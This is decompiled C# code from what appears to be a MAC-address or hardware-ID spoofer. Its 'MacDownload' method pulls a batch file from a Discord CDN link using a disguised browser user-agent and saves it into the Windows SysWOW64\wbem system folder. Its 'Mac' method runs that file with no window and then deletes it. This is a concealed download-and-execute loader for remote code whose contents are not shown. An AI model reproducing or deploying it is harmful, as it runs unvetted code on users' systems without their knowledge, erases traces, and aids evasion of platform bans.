using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace HardDrive
{
    // Token: 0x02000004 RID: 4
    internal class NtwSpoof
    {
        // Token: 0x06000018 RID: 24 RVA: 0x00002C70 File Offset: 0x00000E70
        public static void Mac()
        {
            Process process = new Process();
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat";
            process.Start();
            process.WaitForExit();
            File.Delete("C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
        }

        // Token: 0x06000019 RID: 25 RVA: 0x00002CD8 File Offset: 0x00000ED8
        public static void MacDownload()
        {
            WebClient webClient = new WebClient();
            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/616995965781540878/Mac.Oblivion.bat", "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
            webClient.Proxy = null;
        }
    }
}
